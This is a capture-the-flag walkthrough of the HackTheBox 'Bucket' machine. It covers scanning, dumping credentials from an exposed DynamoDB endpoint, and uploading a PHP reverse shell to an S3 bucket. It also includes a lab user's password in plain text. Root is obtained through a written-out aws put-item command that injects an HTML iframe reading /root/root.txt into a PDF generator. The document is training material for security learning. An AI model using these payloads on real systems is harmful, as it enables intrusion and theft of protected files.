# HackTheBox-Bucket

## Rustscan
```  
rustscan -a 10.10.10.212 -- -A -sC -sV                                                            
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.                                                                                            
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |                  
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |                  
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'                  
The Modern Day Port Scanner.                                              
________________________________________                                  
: https://discord.gg/GFrQsGy           :                                                                                                            
: https://github.com/RustScan/RustScan :                                  
 --------------------------------------                                                                                                             
Please contribute more quotes to our GitHub https://github.com/rustscan/rustscan
[~] The config file is expected to be at "/root/.rustscan.toml"                                                                                     
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.10.212:22                 
Open 10.10.10.212:80  

PORT   STATE SERVICE REASON         VERSION                               
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)                                                             
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41                   
| http-methods:                                                           
|_  Supported Methods: GET HEAD POST OPTIONS                              
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://bucket.htb/ 
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                               
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete                                                                   
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), Linux 2.6.32 (94%), ASUS RT-N56U WAP 
(Linux 3.4) (93%), Linux 3.16 (93%), Adtran 424RG FTTH gateway (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%), Linux 3.2 - 4.9 (92%)
No exact OS matches for host (test conditions non-ideal).                                                  
```

## PORT 80

<img src="https://imgur.com/F8kCYpR.png"/>

It's using a domain name so we are going to add that to `/etc/hosts`

<img src="https://imgur.com/hwKCBoB.png"/>

<img src="https://imgur.com/iVoPtr3.png"/>

Notice that we don't see images , the reason behind it is that it's retreiving the image from `s3.bucket.htb`

<img src="https://imgur.com/pKrvwba.png"/>

Running `dirsearch` against that

<img src="https://imgur.com/d6AmCti.png"/>

<img src="https://imgur.com/BgZT40l.png"/>

If we visit  `s3.bucket.htb/shell`

<img src="https://imgur.com/cwA487v.png"/>

But adding `/` makes a difference

`s3.bucket.htb/shell/`

<img src="https://imgur.com/FOZrjgn.png"/>

Reading the documentation to list tables
```
 var params = {
 };
 dynamodb.listTables(params, function(err, data) {
   if (err) console.log(err, err.stack); // an error occurred
   else     console.log(data);           // successful response
 });
```


<img src="https://imgur.com/UfKcl8Z.png"/>

<img src="https://imgur.com/StsKG3h.png"/>

We have a found a  table name `users` , to view the data from the table

```
var params = {
    TableName:"users"};

docClient.scan(params, (error, result) => {
    if (error) {
      console.log('error', error);
    } else {
      console.log(result.Items); // x items
    }
});

```

<img src="https://imgur.com/NzSud2H.png"/>

Tried using these credentials through ssh but failed 

<img src="https://imgur.com/92pFFyB.png"/>

Also running wfuzz on `http://s3.bucket.htb/shell/` didn't returned anything intersting

<img src="https://imgur.com/MnbRUxK.png"/>

So after spending so much time I realized tha I could also list the tables using `aws cli`

<img src="https://imgur.com/3Iy3BFT.png"/>

We needed to setup the credentials and the region first also to note that our end point url will be `http://s3.bucket.htb`

<img src="https://imgur.com/F3sWdBF.png"/>

<img src="https://imgur.com/J3IRMxu.png"/>

We can view the tables from here as well

<img src="https://imgur.com/YI9CWYr.png"/>

Honestly did not know what I was doing until I ran aws s3 ls again

<img src="https://imgur.com/BM1GfQ9.png"/>

<img src="https://imgur.com/R7qu1kJ.png"/>

Here we can see index.html , if we visit `s3.bucket.htb/adserver/index.html`, it will be the same as `bucket.htb` so this means if we upload a php reverse shell on the bucket which is `adserver` we can access that from `bucket.htb`

<img src="https://imgur.com/9JD6vq9.png"/>

That reverse shell is uploaded also keep it my mind to access that quickly because s3 bucket is going to remove it

<img src="https://imgur.com/cphnr5r.png"/>

We can switch user to `roy` with the password `n2vM-<_K_Q:.Aa2` also if we look for open ports we can find port 8000 is running as http so we can do port forwarding with `chisel`

<img src="https://imgur.com/s5efLeS.png"/>

On our machine 

<img src="https://imgur.com/m7ZaOnp.png"/>

On target machine

<img src="https://imgur.com/QvesVHl.png"/>

<img src="https://imgur.com/VMDuMaB.png"/>

We can also find `bucket-app` in /var/www

<img src="https://imgur.com/YZBaJ7j.png"/>

Looking at `index.php` it's using dynamodb  client to iterate contents of `alerts` table and then reading it and storing it to a pdf using `pd4ml` which converts html and css to pdf

So we need to create a table first 

```
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
--provisioned-throughput \
        ReadCapacityUnits=10,WriteCapacityUnits=5 --endpoint-url 'http://s3.bucket.htb'
```

<img src="https://imgur.com/ccGCPj8.png"/>

<img src="https://imgur.com/H8gbH0Q.png"/>

Now we need to insert the data

```
aws dynamodb put-item \                                                                                                                           
    --table-name alerts \                                                                                                                       
    --item '{
        "title": {"S": "Ransomware"},
        "data": {"S": "<html><head></head><body><iframe src='/root/root.txt'></iframe></body></html>"}
      }' \                                                                                                          
    --return-consumed-capacity TOTAL --endpoint-url http://s3.bucket.htb
```

<img src="https://imgur.com/O9UQ7xL.png"/>

<img src="https://imgur.com/6OT0LNh.png"/>

Now doing a POST request with `action=get_alerts`

`curl --data "action=get_alerts" -X POST http://127.0.0.1:8000`

<img src="https://imgur.com/SF5ntky.png"/>

Note : The converted pdf file will get removed also the table so you need to be quick here to get the file

I started a python http server

<img src="https://imgur.com/QkL69ne.png"/>

<img src="https://imgur.com/8QHZ82X.png"/>

And we got the root flag , although I was able to get the private ssh key but couldn't make it in a proper format so I just left having a root hash